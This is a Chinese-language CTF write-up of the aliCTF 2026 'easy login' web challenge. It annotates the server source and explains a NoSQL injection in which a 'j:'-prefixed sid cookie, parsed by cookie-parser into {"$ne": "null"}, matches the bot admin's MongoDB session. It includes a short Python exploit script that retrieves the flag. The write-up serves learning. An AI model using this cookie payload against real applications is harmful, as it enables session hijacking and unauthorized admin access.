---
title: easy login
published: 2026-02-03
pinned: false
description: aliCTF 2026 web
tags:
  - web
category: ctf
author: wtt
draft: false
date: 2026-02-03
---

## 0x10 题目分析
这是aliCTF 2026 的web题
### 1.打开网页
打开所给的网址，页面如下
![](images/Pasted%20image%2020260203182150.png)

### 2./src/server.ts（关键部分）
```python
# 使用了mongodb数据库
import { MongoClient, Db, Collection } from 'mongodb';
# 使用了cookieParser
import cookieParser from 'cookie-parser';
# 使用了机器人库 在服务器里用代码控制一个headless浏览器
import puppeteer from 'puppeteer';
# admin 用户会随机生成一个长字符串密码
const ADMIN_PASSWORD = crypto.randomBytes(16).toString('hex');

# 机器人带着 admin 登录态的 cookie
async function runXssVisit(targetUrl: string): Promise<void>
 {
	# url类型检查 + 正则校验 URL 必须是 http/https
  if (typeof targetUrl !== 'string' || !/^https?:\/\//i.test(targetUrl)) {
    throw new Error('invalid target url');
  }
	# 启动浏览器 ，browser 作为浏览器控制对象
  const browser = await puppeteer.launch({
    headless: true,
    args: ['--no-sandbox', '--disable-setuid-sandbox']
  });
  try {
	# 启动headless Chrome 进程
    const page = await browser.newPage();
	# 机器人XSS Bot打开网站首页
    await page.goto(APP_INTERNAL_URL + '/', {
      waitUntil: 'networkidle2',
      timeout: 15000
    });
	# 用 admin + 正确密码登录
    await page.type('#username', 'admin', { delay: 30 });
    await page.type('#password', ADMIN_PASSWORD, { delay: 30 });
    # > 点击登录按钮 + 等待登录请求发出去并收到响应,都完成了代码才会继续往下执行
    await Promise.all([
	# 提交表单 ，发送post请求登录
      page.click('#loginForm button[type="submit"]'),
      page.waitForResponse(
        (res) => res.url().endsWith('/login') && res.request().method() === 'POST',
        { timeout: 10000 }
      ).catch(() => undefined)
    ]);

	# 通过get请求（浏览器默认发起的GET / HTTP/1.1），访问你提供的 URL
    await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 15000 });
	# 停留 5 秒
    await new Promise((resolve) => setTimeout(resolve, 5000));
  } finally {

    await browser.close();
  }
}

async function sessionMiddleware(req: AuthedRequest, res: Response, next: NextFunction): Promise<void> {
	# 获取 cookie 中的 sid
  const sid = req.cookies?.sid as string | undefined;
  if (!sid || !sessionsCollection || !usersCollection) {
    req.user = null;
    return next();
  }
  try {
	# 根据 sid 查 session,去 MongoDB 里查sessions 表
    const session = await sessionsCollection.findOne({ sid });
    if (!session) {
      req.user = null;
      return next();
    }
    # 根据 session 里的用户名查用户,去 MongoDB 里查 users 表
    const user = await usersCollection.findOne({ username: session.username });
    if (!user) {
      req.user = null;
      return next();
    }
    # 把身份挂到 req 上
    req.user = { username: user.username };
    return next();
  }
}

#get请求进 /admin ；如果是post请求进不去
app.get('/admin', (req: AuthedRequest, res: Response) => {
  if (!req.user || req.user.username !== 'admin') {
    return res.status(403).json({ error: 'admin only' });
  }
  res.json({ flag: FLAG });
});

#post请求进 /visit
app.post('/visit', async (req: Request, res: Response) => {
	# 从 body 里解构出 url 字段
  const { url } = req.body as { url?: unknown };
  if (typeof url !== 'string') {
    return res.status(400).json({ error: 'url must be a string' });
  }
  try {
	  # 机器人访问提供的 url
    await runXssVisit(url);
    return res.json({ ok: true });
  } catch (err: any) {
    console.error('XSS bot error:', err);
    return res.status(500).json({ error: 'bot failed', detail: String(err) });
  }
});

res.cookie('sid', sid, {
  httpOnly: false,
  sameSite: 'lax'
});

# session 参数
async function createSessionForUser(user: UserDoc): Promise<string> {
  if (!sessionsCollection) {
    throw new Error('sessions collection not initialized');
  }
  const sid = crypto.randomBytes(16).toString('hex');
  await sessionsCollection.insertOne({
    sid,# session ID
    username: user.username, # 用户身份
    createdAt: new Date() # 创建时间
  });
  return sid;
}

```

## 0x20 利用思路
### 1.MongoDB
传统 SQL 查询是字符串
```sql
SELECT * FROM users WHERE username = 'admin'
```
而 **MongoDB 不用 SQL 字符串**，它用 **JSON 对象** 表示查询条件,
MongoDB 查询对象的通用结构是：`{ 字段名: 查询条件 }`
```python
db.users.findOne({ username: "admin" })
#  username == "admin"
db.users.findOne({ sid: { $ne: "null" } })
#sid != null
```

### 2.cookie-parser
服务器用了`cookie-parser`, Cookie 的值以 `j:` 开头，会自动 `JSON.parse`,服务器端拿到的就不是字符串，而是对象，从而构造查询条件
```python
cookies = {
"sid": 'j:{"$ne": "null"}'
}
# ==>
db.users.findOne{ sid: { $ne: "null" } }
```
sid 不等于 null 的任意 session,几乎所有 session 都符合条件，MongoDB 会返回 **第一条匹配的 session** ，sid=admin_id
1. 浏览器 Cookie 里的 sid  
2. 数据库 sessions 表
3. 找到对应 username
4. 认定当前请求的身份

## 0x30 利用脚本
```python
import requests
target = "http://223.6.249.127:41693"

# 第一步：唤醒 Bot 登录，产生 Admin Session
print("[*] Waking up the bot...")
# 让机器人访问哪个网址都行，只要访问了target就能留下cookie
requests.post(f"{target}/visit", json={"url": "http://example.com"})

# 第二步：使用 NoSQL 注入 Cookie 劫持 Admin 权限
print("[*] Exploiting NoSQL Injection...")
cookies = {
# 'j:' 前缀触发 cookie-parser 的 JSON 解析逻辑
"sid": 'j:{"$ne": "null"}'
}
res = requests.get(f"{target}/admin", cookies=cookies)
print("[+] Server Response:")
print(res.text)
```

Q: res = requests.post(f"{target}/visit", json={"url": \"http://xxx/admin"})
为什么flag不能通过 res.json({ flag: FLAG })泄露？  
A:`/admin` 页面确实被机器人成功打开了 ,但 flag **只显示在机器人那个浏览器页面里**，不会自动发给你

## 0x40 相关知识
### 1.res = requests.get()

```
cookies = {"sid": "123456"}
res = requests.get(
    "http://example.com/search",
    # 带查询参数 ==> GET /search?q=test&page=2
    params={"q": "test", "page": 2},
    # 带请求头
    headers={"User-Agent": "Mozilla/5.0"}
    # 带 Cookie，通过 检查器-application-cookie 可以看cookie参数
    cookies=cookies
)
```

### 2.res常用属性

| 属性                | 类型                | 作用                       |
| ----------------- | ----------------- | ------------------------ |
| `res.status_code` | int               | HTTP 状态码（200, 404, 500…） |
| `res.text`        | str               | 服务器返回的文本内容（自动解码）         |
| `res.content`     | bytes             | 原始字节内容（比如图片、二进制文件）       |
| `res.headers`     | dict-like         | 响应头                      |
| `res.cookies`     | RequestsCookieJar | 服务器设置的 Cookies           |
| `res.json`        | dict              | 服务器返回的是JSON 格式数据时才用      |

### 3.HttpOnly 
是 **Cookie 的一个属性**，用来控制 **浏览器端 JavaScript 是否能访问这个 Cookie**
- `HttpOnly: true` → JS **不能读取**，只能由浏览器自动带给 HTTP 请求（比如 fetch、ajax、页面请求）
    
- `HttpOnly: false` → JS 可以通过 `document.cookie` 读取或修改

### 4.sameSite: 'lax'
跨站请求时浏览器是否带 Cookie

| 场景                 | 会不会带 Cookie |
| ------------------ | ----------- |
| 用户正常点链接跳转          | 会带          |
| 第三方站点发 POST 表单     | 不带          |
| 图片、iframe、fetch 跨站 | 通常不带        |

### 5.NoSQL 注入
查询不是用字符串拼接，而是用 **JSON 对象** 表示

### 6.MongoDB其他查询条件写法

| 写法                                 | 含义                        |
| ---------------------------------- | ------------------------- |
| `{ age: 18 }`                      | age 等于 18                 |
| `{ age: { $gt: 18 } }`             | age 大于 18                 |
| `{ age: { $lt: 18 } }`             | age 小于 18                 |
| `{ age: { $ne: 18 } }`             | age 不等于 18                |
| `{ username: { $regex: "^adm" } }` | 查找 username 以 `adm` 开头的用户 |

## 0x50 参考链接
[su-team](https://su-team.cn/post/alictf-su-2026-wu/?sessionid=#easy_login)
